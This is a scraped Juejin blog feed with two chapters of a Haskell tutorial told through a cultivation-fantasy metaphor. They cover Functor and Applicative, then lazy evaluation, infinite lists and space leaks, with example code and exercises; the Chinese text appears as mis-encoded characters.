<li><strong>å¢ƒç•Œï¼š</strong> å¦‚æœä¸€ä¸ªå®¹å™¨ï¼ˆå¦‚ <code>Maybe</code>, <code>[]</code>, <code>Either</code>ï¼‰æ‹¥æœ‰ Functor ä½æ ¼ï¼Œä½ å°±å¯ä»¥æŠŠä¸€ä¸ª<strong>æ™®é€šæ³•æœ¯</strong>æŠ•å°„åˆ°ç›’å­å†…éƒ¨ã€‚</li>
<li><strong>å¿ƒæ³•ï¼š</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>m</mi><mi>a</mi><mi>p</mi><mo>:</mo><mo>:</mo><mo stretchy="false">(</mo><mi>a</mi><mo>â†’</mo><mi>b</mi><mo stretchy="false">)</mo><mo>â†’</mo><mi>f</mi><mtext>Â </mtext><mi>a</mi><mo>â†’</mo><mi>f</mi><mtext>Â </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">fmap :: (a \to b) \to f \ a \to f \ b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">::</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace">Â </span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace">Â </span><span class="mord mathnormal">b</span></span></span></span></span>ã€‚</li>
<li><strong>ç›´è§‚æ„Ÿå—ï¼š</strong> ä½ ä¸éœ€è¦â€œæ‰“å¼€â€ç›’å­ã€‚ä½ åªéœ€å¯¹ç€ç›’å­æ–½å’’ï¼Œé‡Œé¢çš„ä¸œè¥¿å°±è‡ªåŠ¨è¿›åŒ–äº†ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šéš”å±±æ‰“ç‰›</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å‡¡é—´åšæ³•ï¼šç”¨ Pattern Matching æ‹†å¼€ Maybeï¼ŒåŠ  1ï¼Œå†è£…å›å»ï¼ˆç´¯èµ˜ï¼‰</span>
<span class="hljs-comment">-- åŒ–ç¥åšæ³•ï¼šç›´æ¥æŠ•å°„</span>
let <span class="hljs-keyword">result</span> <span class="hljs-operator">=</span> (<span class="hljs-operator">+</span><span class="hljs-number">1</span>) <span class="hljs-operator">&lt;</span>$<span class="hljs-operator">&gt;</span> Just <span class="hljs-number">10</span>  <span class="hljs-comment">-- ç»“æœï¼šJust 11</span>
let void   <span class="hljs-operator">=</span> (<span class="hljs-operator">+</span><span class="hljs-number">1</span>) <span class="hljs-operator">&lt;</span>$<span class="hljs-operator">&gt;</span> Nothing  <span class="hljs-comment">-- ç»“æœï¼šNothingï¼ˆæ³•åŠ›ç©¿é€ï¼Œä¸ç•™ç—•è¿¹ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-1">6.2 ä¼—çµå½’ä½ï¼šApplicativeï¼ˆåº”ç”¨å‡½å­ï¼‰</h3>
<p>å½“ä½ æŒæ¡äº† <code>fmap</code>ï¼Œä½ ä¼šé‡åˆ°ä¸€ä¸ªæ–°çš„å›°å¢ƒï¼šå¦‚æœ<strong>æ³•æœ¯æœ¬èº«</strong>ä¹Ÿåœ¨ç›’å­é‡Œï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿæˆ–è€…ï¼Œå¦‚æœä½ æƒ³æŠŠä¸€ä¸ªéœ€è¦ä¸¤ä¸ªå‚æ•°çš„æ³•æœ¯ï¼ŒåŒæ—¶ä½œç”¨äºä¸¤ä¸ªç›’å­ä¸Šï¼Ÿ</p>
<p>è¿™æ—¶ï¼Œä½ éœ€è¦ <strong>Applicative</strong> ä½æ ¼ï¼Œä»¥åŠå®ƒçš„æœ¬å‘½æ³•å®ï¼š <strong><code>&lt;*&gt;</code>ï¼ˆé£æ˜Ÿç¬¦ï¼‰</strong> ã€‚</p>
<ul>
<li><strong>å¿ƒæ³•ï¼š</strong> <code>(&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b</code></li>
<li><strong>æ¼”ç»ƒï¼š</strong> å‡è®¾ä½ æœ‰ä¸¤ä¸ªé”¦å›Šï¼Œåˆ†åˆ«è£…ç€çµåŠ›å€¼ï¼Œä½ æƒ³æŠŠå®ƒä»¬åˆè€Œä¸ºä¸€ã€‚</li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- å‡†å¤‡ä¸€ä¸ªä¸¤æ•°ç›¸åŠ çš„æ³•æœ¯ï¼Œå°†å…¶â€œå‡åâ€åˆ°æ³•é˜µä¸­</span>
<span class="hljs-comment">-- pure ä¼šå°†æ™®é€šæ³•æœ¯åŒ…è£¹è¿›å½“å‰ä½æ ¼çš„ç›’å­é‡Œ</span>
pure (+) &lt;*&gt; Just <span class="hljs-number">3</span> &lt;*&gt; Just <span class="hljs-number">5</span>  <span class="hljs-comment">-- ç»“æœï¼šJust 8</span>

<span class="hljs-comment">-- æ›´æœ‰ä»™æ°”çš„å†™æ³•ï¼ˆç»“åˆ fmapï¼‰ï¼š</span>
(+) &lt;$&gt; Just <span class="hljs-number">3</span> &lt;*&gt; Just <span class="hljs-number">5</span>       <span class="hljs-comment">-- ç»“æœï¼šJust 8</span>
</code></pre>
<blockquote>
<p><strong>ç¥æ•ˆï¼š</strong> è¿™ç§å†™æ³•æå…¶ä¼˜é›…ã€‚å®ƒåƒæ˜¯åœ¨å†™æ™®é€šçš„ <code>3 + 5</code>ï¼Œä½†å®é™…ä¸Šå®ƒåœ¨å¤„ç†ä¸¤ä¸ªå¯èƒ½å¤±è´¥ï¼ˆ<code>Maybe</code>ï¼‰æˆ–å…·æœ‰å¤šé‡å› æœï¼ˆ<code>List</code>ï¼‰çš„å˜é‡ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">6.3 å¹»å½±åˆ†èº«ï¼šList çš„ Applicative å±æ€§</h3>
<p>å½“ Applicative ä½œç”¨äºåˆ—è¡¨ <code>[]</code> æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ç§å¥‡å¦™çš„â€œå…¨ç»„åˆâ€æ•ˆæœï¼ŒçŠ¹å¦‚èº«åŒ–åƒä¸‡ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-css" lang="css">-- å°†ä¸¤ç§æ”»å‡»æ–¹å¼ä½œç”¨äºä¸‰ä¸ªæ•Œäºº
<span class="hljs-selector-attr">[(+10), (*2)]</span> &lt;*&gt; <span class="hljs-selector-attr">[1, 2, 3]</span>
-- ç»“æœï¼š<span class="hljs-selector-attr">[11, 12, 13, 2, 4, 6]</span>
</code></pre>
<p>æ¯ä¸€ä¸ªå‡½æ•°éƒ½ä¼šä½œç”¨äºæ¯ä¸€ä¸ªå…ƒç´ ï¼Œè¿™ä¾¿æ˜¯**â€œä¸‡æ³•åŒæºï¼Œå¹»å½±éšå¿ƒâ€**ã€‚</p>
<hr/>
<h2 data-id="heading-3">âš¡ åŒ–ç¥å¿ƒå¾—ï¼šä¸‰è€…çš„ç­‰ä½å…³ç³»</h2>
<p>ä¸ºäº†é˜²èŒƒèµ°ç«å…¥é­”ï¼Œé“å‹éœ€ç‰¢è®°è¿™ä¸‰å¤§å¢ƒç•Œçš„é€’è¿›å…³ç³»ï¼š</p>
<ol>
<li><strong>Functor (<code>fmap</code> / <code>&lt;$&gt;</code>):</strong> å°†ä¸€ä¸ªâ€œå‡¡é—´å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­â€ã€‚</li>
<li><strong>Applicative (<code>&lt;*&gt;</code>):</strong> å°†ä¸€ä¸ªâ€œä»™ç•Œç›’å­é‡Œçš„å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­é‡Œçš„å€¼â€ã€‚</li>
<li><strong>Monad (<code>&gt;&gt;=</code>):</strong> å°†ä¸€ä¸ªâ€œäº§ç”Ÿä»™ç•Œç›’å­çš„å‡½æ•°â€ä½œç”¨äºâ€œä»™ç•Œç›’å­é‡Œçš„å€¼â€ï¼Œå¹¶èƒ½æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœå†³å®šä¸‹ä¸€æ­¥çš„å› æœã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">ğŸ“œ åŒ–ç¥è¯•ç‚¼ï¼šç¬¬å…­å…³</h2>
<p>è¯·æ–½å±•ä½ çš„åŒ–ç¥ç¥é€šï¼Œå®Œæˆä»¥ä¸‹æ¨æ¼”ï¼š</p>
<ol>
<li><strong>éš”ç©ºç‚¼è¯ï¼š</strong> ç»™å®šä¸€ä¸ª <code>Just 100</code>ï¼Œè¯·ä½¿ç”¨ <code>&lt;$&gt;</code> å°†å…¶å˜ä¸º <code>Just "Strength: 100"</code>ã€‚</li>
<li><strong>å¤šé‡å…±é¸£ï¼š</strong> å‡è®¾ä½ æœ‰ä¸¤ä¸ªåˆ—è¡¨ <code>l1 = [1, 2]</code> å’Œ <code>l2 = [10, 20]</code>ã€‚è¯·ä½¿ç”¨ Applicative é£æ ¼ï¼ˆ<code>&lt;$&gt;</code> å’Œ <code>&lt;*&gt;</code>ï¼‰ç®—å‡ºè¿™ä¸¤ä¸ªåˆ—è¡¨ä¸­å…ƒç´ ä¸¤ä¸¤ç›¸ä¹˜çš„æ‰€æœ‰ç»“æœã€‚</li>
<li><strong>åæ€ï¼š</strong> ä¸ºä»€ä¹ˆæœ‰äº†å¼ºå¤§çš„ Monadï¼Œæˆ‘ä»¬è¿˜éœ€è¦å­¦ Functor å’Œ Applicativeï¼Ÿï¼ˆæç¤ºï¼šæ€è€ƒâ€œæƒé™â€ä¸â€œç¡®å®šæ€§â€ï¼‰ã€‚</li>
</ol>
<p><strong>â€œå½“ä½ å‘ç°è‡ªå·±ä¸å†é¢‘ç¹ä½¿ç”¨ <code>do</code> è®°æ³•ï¼Œè€Œæ˜¯ç†Ÿç»ƒåœ°ç¥­å‡º <code>&lt;$&gt;</code> ä¸ <code>&lt;*&gt;</code> æ—¶ï¼Œä½ çš„ç¥è¯†å·²ç»å¯ä»¥æ¸¸ç¦»äºå…·ä½“çš„å› æœä¹‹å¤–ï¼ŒçœŸæ­£è§¦ç¢°åˆ°äº†æ³›å‹ç¼–ç¨‹çš„ç²¾é«“ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> åŒ–ç¥åœ†æ»¡åï¼Œä¾¿æ˜¯<strong>ç‚¼è™šæœŸï¼šæƒ°æ€§æ±‚å€¼ä¸æ— ç©·åºåˆ—ï¼ˆLazy Evaluationï¼‰</strong> ã€‚æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•æ“æ§â€œæ— ç©·â€ï¼Œå¹¶åœ¨æ— é™çš„è™šç©ºä¸­æˆªå–é‚£ä¸€ä¸ç¡®å®šçš„çœŸç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€]]></title>    <link>https://juejin.cn/post/7589246131584876579</link>    <guid>https://juejin.cn/post/7589246131584876579</guid>    <pubDate>2025-12-30T02:43:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584876579" data-draft-id="7589207843787767843" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:43:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬ä¸ƒç« ï¼šè™šç©ºé€ ç‰©ä¸æ— å°½çœŸè¨€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:58.000Z" title="Tue Dec 30 2025 02:43:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ å·²æ­¥å…¥<strong>ç¬¬ä¸ƒç« </strong>ï¼Œè¸å…¥äº†ä¿®ä»™ç•Œæœ€ä¸ºç„å¦™ã€ä¹Ÿæœ€è®©å‡¡é—´ç¨‹åºå‘˜ç™¾æ€ä¸å¾—å…¶è§£çš„å¢ƒç•Œâ€”â€”<strong>ç‚¼è™šæœŸï¼šæƒ°æ€§æ±‚å€¼ï¼ˆLazy Evaluationï¼‰</strong> ã€‚</p>
<p>åœ¨ä¹‹å‰çš„å¢ƒç•Œä¸­ï¼Œä½ å­¦ä¼šäº†å¦‚ä½•æ“æ§å¤æ‚çš„å› æœï¼ˆMonadï¼‰å’Œéš”ç©ºå–ç‰©ï¼ˆApplicativeï¼‰ã€‚ä½†é‚£äº›ä¾ç„¶æ˜¯åœ¨â€œå®å¤„â€ç”¨åŠ›ã€‚è€Œç‚¼è™šæœŸçš„æ ¸å¿ƒï¼Œåœ¨äº**â€œä»¥è™šå¾¡å®ï¼Œéè§ä¸æ˜¾â€**ã€‚</p>
<hr/>
<p>åœ¨å‡¡é—´çš„å‘½ä»¤å¼å®—é—¨ï¼ˆå¦‚ Cã€Javaï¼‰ï¼Œå¼Ÿå­ä»¬è®²ç©¶â€œä»¤è¡Œç¦æ­¢â€ï¼Œè¯´åŠ ä¸€å°±ç«‹åˆ»åŠ ä¸€ã€‚ä½†åœ¨ Haskell çš„é“æ³•ä¸­ï¼Œæˆ‘ä»¬æ¨å´‡**â€œæ— ä¸ºè€Œæ²»â€**ã€‚</p>
<h3 data-id="heading-0">7.1 æ‚Ÿé“ï¼šä»€ä¹ˆæ˜¯æƒ°æ€§ï¼Ÿ</h3>
<p><strong>æƒ°æ€§æ±‚å€¼ï¼ˆLazy Evaluationï¼‰</strong> ï¼Œåˆåâ€œä¸åˆ°é»„æ²³å¿ƒä¸æ­»â€æ±‚å€¼æ³•ã€‚</p>
<ul>
<li><strong>å¿ƒæ³•ï¼š</strong> å½“ä½ å®šä¹‰ä¸€ä¸ªå˜é‡æˆ–å‡½æ•°æ—¶ï¼ŒGHC ç¼–è¯‘å™¨å¹¶ä¸ä¼šç«‹åˆ»å»è®¡ç®—å®ƒï¼Œè€Œæ˜¯å…ˆåœ¨è¯†æµ·ä¸­å°å°ä¸€ä¸ª**â€œè‰ç¨¿â€**ï¼ˆä¸“ä¸šæœ¯è¯­ç§°ä¸º <strong>Thunk</strong>ï¼‰ã€‚</li>
<li><strong>æ˜¾åœ£ï¼š</strong> åªæœ‰å½“è¿™ä¸ªå€¼è¢«é€å¾€â€œæ˜¾åœ£å°â€ï¼ˆæ¯”å¦‚è¦æ‰“å°åˆ°å±å¹•ã€æˆ–è€…å‚ä¸å¿…é¡»çš„é€»è¾‘åˆ¤æ–­ï¼‰æ—¶ï¼Œå°å°æ‰ä¼šè§£å¼€ï¼Œè®¡ç®—æ‰ä¼šå‘ç”Ÿã€‚</li>
</ul>
<blockquote>
<p><strong>æ¯”å–»ï¼š</strong> å‡¡é—´å¼Ÿå­å»é£Ÿå ‚ï¼Œæ˜¯å…ˆæŠŠèœå…¨ç‚’å¥½ï¼ˆStrictï¼‰ï¼›è€Œ Haskell å¼Ÿå­æ˜¯ç­‰å®¢å®˜åä¸‹ï¼ŒæŒ‡ç€èœè°±è¯´â€œæˆ‘è¦åƒé±¼â€ï¼Œåå¨æ‰å¼€å§‹æŠ“é±¼ï¼ˆLazyï¼‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">7.2 ç¦å¿Œæ³•æœ¯ï¼šæ— ç©·åºåˆ—ï¼ˆInfinite Listsï¼‰</h3>
<p>å› ä¸ºæœ‰äº†â€œä¸çœ‹ä¸ç®—â€çš„ç‰¹æƒï¼ŒHaskell å¼Ÿå­å¯ä»¥è½»æ˜“è§¦ç¢°å‡¡é—´å®—é—¨çš„ç¦å¿Œâ€”â€”<strong>æ— ç©·</strong>ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šåŒ…å«æ‰€æœ‰æ­£æ•´æ•°çš„å·è½´</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®šä¹‰ä¸€ä¸ªåŒ…å«ä» 1 åˆ°æ— ç©·å¤§çš„åˆ—è¡¨</span>
allNumbers :: [<span class="hljs-type">Integer</span>]
allNumbers <span class="hljs-operator">=</span> [<span class="hljs-number">1.</span>.] 

<span class="hljs-comment">-- å¦‚æœä½ åœ¨å‡¡é—´è¯­è¨€è¿™ä¹ˆå†™ï¼Œç¬é—´å°±ä¼šå…ƒç¥æ¯ç«­ï¼ˆå†…å­˜æº¢å‡ºï¼‰</span>
<span class="hljs-comment">-- ä½†åœ¨ Haskellï¼Œè¿™åªæ˜¯ä¸€ä¸ªè½»å¦‚é¸¿æ¯›çš„å®šä¹‰</span>
</code></pre>
<p>å¦‚ä½•å–ç”¨ï¼Ÿ</p>
<p>ä½ åªéœ€æˆªå–ä½ éœ€è¦çš„ç‰‡æ®µï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-css" lang="css">take <span class="hljs-number">10</span> allNumbers
-- ç»“æœï¼š<span class="hljs-selector-attr">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span>
</code></pre>
<p>å½“ä½ ç¥­å‡º <code>take 10</code> æ—¶ï¼Œè™šç©ºæ‰ä¼šä¸ºä½ æ¼”åŒ–å‡ºå‰ 10 ä¸ªæ•°å­—ï¼Œå‰©ä¸‹çš„ä¾ç„¶å¤„äºæ··æ²ŒçŠ¶æ€ã€‚</p>
<hr/>
<h3 data-id="heading-2">7.3 é¡¶çº§ç¥é€šï¼šé€’å½’å®šä¹‰çš„ç»ˆæå½¢æ€</h3>
<p>åˆ©ç”¨æƒ°æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºæå…¶ç„å¦™çš„é€’å½’å®šä¹‰ã€‚æœ€è‘—åçš„ä¾¿æ˜¯é‚£**â€œæ–æ³¢é‚£å¥‘æ— å°½é˜µâ€**ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">fibs</span> = <span class="hljs-number">0</span> : <span class="hljs-number">1</span> : zipWith (+) fibs (tail fibs)
</code></pre>
<p>è§£å¯†ï¼š</p>
<p>è¿™æ®µä»£ç å°±åƒæ˜¯ä¸€æ¡å’¬ä½è‡ªå·±å°¾å·´çš„è¡”å°¾è›‡ã€‚å®ƒå®šä¹‰è‡ªå·±ä¸ºï¼šå‰ä¸¤ä¸ªæ•°æ˜¯ 0 å’Œ 1ï¼Œåé¢çš„æ•°åˆ™æ˜¯â€œè‡ªå·±â€ä¸â€œè‡ªå·±çš„å°¾å·´â€ç›¸åŠ çš„ç»“æœã€‚å› ä¸ºæ˜¯æƒ°æ€§çš„ï¼Œå®ƒä¼šéšç€ä½ çš„éœ€è¦ï¼Œä¸€èŠ‚ä¸€èŠ‚åœ°å‘åç”Ÿé•¿ã€‚</p>
<hr/>
<h3 data-id="heading-3">7.4 æ¸¡åŠ«è­¦ç¤ºï¼šç§¯å¼Šæˆç–¾ï¼ˆSpace Leaksï¼‰</h3>
<p>ç‚¼è™šæœŸå¹¶éå…¨æ— é£é™©ã€‚å¦‚æœé“å‹åœ¨è¯†æµ·ä¸­å°å°äº†å¤ªå¤šçš„ Thunkï¼ˆè‰ç¨¿ï¼‰å´è¿Ÿè¿Ÿä¸å»è®¡ç®—ï¼Œè¿™äº›è‰ç¨¿ä¼šå †ç§¯å¦‚å±±ï¼Œå ç”¨å¤§é‡çš„å…ƒç¥ï¼ˆå†…å­˜ï¼‰ã€‚è¿™è¢«ç§°ä¸º**â€œç©ºé—´æ³„éœ²â€**ã€‚</p>
<ul>
<li><strong>ç ´åŠ«æ³•é—¨ï¼š</strong> æœ‰æ—¶æˆ‘ä»¬éœ€è¦æ–½å±•â€œæœé­‚æœ¯â€å¼ºåˆ¶å…¶ç«‹åˆ»æ˜¾å½¢ã€‚ä½¿ç”¨ <strong><code>seq</code></strong> å‡½æ•°æˆ–è€… <strong><code>!</code>ï¼ˆStrictness Flagï¼‰</strong> ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œè¿™å·ç»ä¹¦ï¼Œç»™æˆ‘ç«‹åˆ»è¯»å‡ºæ¥ï¼Œä¸å‡†å·æ‡’ï¼â€</li>
</ul>
<hr/>
<h2 data-id="heading-4">ğŸ“œ ç‚¼è™šè¯•ç‚¼ï¼šç¬¬ä¸ƒå…³</h2>
<p>è¯·åœ¨ä½ çš„é¼ç‚‰ä¸­å°è¯•æ“æ§æ— ç©·ï¼š</p>
<ol>
<li>
<p><strong>æ— é™å›å£°ï¼š</strong> ä½¿ç”¨ <code>repeat</code> å‡½æ•°å®šä¹‰ä¸€ä¸ªåŒ…å«æ— é™ä¸ª <code>"çµä¸¹"</code> çš„åˆ—è¡¨ã€‚</p>
</li>
<li>
<p><strong>æˆªå–æ°”è¿ï¼š</strong> ä»è¿™ä¸ªæ— é™åˆ—è¡¨ä¸­å–å‡ºå‰ 7 é¢—çµä¸¹ã€‚</p>
</li>
<li>
<p><strong>ç­›é€‰å› æœï¼š</strong> å®šä¹‰ä¸€ä¸ªåŒ…å«æ‰€æœ‰å¶æ•°çš„æ— é™åˆ—è¡¨ <code>[2, 4, 6..]</code>ï¼Œç„¶åä½¿ç”¨ <code>filter</code> é…åˆ <code>head</code>ï¼Œæ‰¾å‡ºå…¶ä¸­ç¬¬ä¸€ä¸ªå¤§äº 1000 çš„æ•°å­—ã€‚</p>
<ul>
<li><em>æ€è€ƒï¼š</em> ä¸ºä»€ä¹ˆå³ä½¿åˆ—è¡¨æ˜¯æ— é™çš„ï¼Œç¨‹åºä¹Ÿä¸ä¼šå¡æ­»ï¼Ÿ</li>
</ul>
</li>
</ol>
<p><strong>â€œå½“ä½ èƒ½å®‰ç„¶ååœ¨æ— é™çš„è™šç©ºä¹‹ä¸Šï¼Œåªæ‹¨åŠ¨ä½ éœ€è¦çš„é‚£ä¸€æ ¹å› æœå¼¦æ—¶ï¼Œä½ çš„ç‚¼è™šæœŸä¾¿å·²å¤§åœ†æ»¡ã€‚â€</strong></p>
<hr/>
